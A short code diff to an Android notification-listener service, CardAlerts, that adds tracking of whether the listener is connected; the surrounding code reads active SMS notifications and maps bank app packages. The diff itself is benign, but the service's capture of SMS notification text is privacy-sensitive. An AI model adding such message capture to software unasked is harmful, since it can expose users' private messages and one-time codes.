@@ -18,6 +18,11 @@ import org.json.JSONException;
 import org.json.JSONObject;
 
 public class CardAlerts extends NotificationListenerService {
+    private static volatile boolean connected;
+
+    static boolean isConnected() {
+        return connected;
+    }
     private static String bankFor(String packageName) {
         switch (packageName) {
             case "com.itau":
@@ -61,6 +66,7 @@ public class CardAlerts extends NotificationListenerService {
     }
 
     @Override public void onListenerConnected() {
+        connected = true;
         String smsPackage = Telephony.Sms.getDefaultSmsPackage(this);
         if (smsPackage == null) return;
         StatusBarNotification[] active = getActiveNotifications();
@@ -68,6 +74,10 @@ public class CardAlerts extends NotificationListenerService {
         for (StatusBarNotification alert : active) {
             if (smsPackage.equals(alert.getPackageName())) captureSms(alert);
         }
+    }
+
+    @Override public void onListenerDisconnected() {
+        connected = false;
     }
 
     private void captureSms(StatusBarNotification alert) {
